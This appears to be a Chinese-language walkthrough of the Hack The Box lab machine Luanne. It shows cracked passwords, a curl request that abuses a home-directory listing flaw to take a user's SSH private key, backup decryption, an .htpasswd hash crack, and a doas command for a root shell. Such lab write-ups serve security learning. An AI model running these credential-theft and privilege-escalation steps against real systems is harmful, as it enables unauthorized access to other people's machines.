![](https://img-blog.csdnimg.cn/20210324224010170.png)
在[https://www.somd5.com/](https://www.somd5.com/)得到密码`iamthebest`，即可登录80端口，并在`/etc/supervisord.conf`发现9001端口web服务用户名和密码
![](https://img-blog.csdnimg.cn/2021032623475830.png)
登录发现为`Supervisor 4.2.0`
![](https://img-blog.csdnimg.cn/20210326235052991.png)
这里可以访问`/logtail/processes`发现日志中的3001端口相关信息，并存在一个CVE，[Eterna bozotic HTTP服务器权限许可和访问控制漏洞 ](https://www.anquanke.com/vul/id/1178769)
![](https://img-blog.csdnimg.cn/20210327000005303.png)
远程攻击者可以借助以`"/~"`序列开头的多个URIs请求获取主目录列表内容，并确定用户账号的存在
`curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa`，获取用户的私钥内容
![](https://img-blog.csdnimg.cn/20210327000448613.png)
使用id_rsa登录即可获取普通用户权限(注意id_rsa权限为0600)
![](https://img-blog.csdnimg.cn/20210327001235483.png)
在backups发现存在`devel_backup-2020-09-16.tar.gz.enc`文件，使用netpgp命令解密enc文件
```bash
cd /tmp
netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel.tar.gz
tar zxvf devel.tar.gz
cat devel-2020-09-16/www/.htpasswd
```
![](https://img-blog.csdnimg.cn/20210327004048721.png)
`$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.`解密得到密码为`littlebear`。使用该密码获得root权限的Shell
```bash
doas -u root /bin/sh
```
![](https://img-blog.csdnimg.cn/20210327004419196.png)
参考：[Hack The Box——Luanne](https://blog.csdn.net/qq_32261191/article/details/110739723)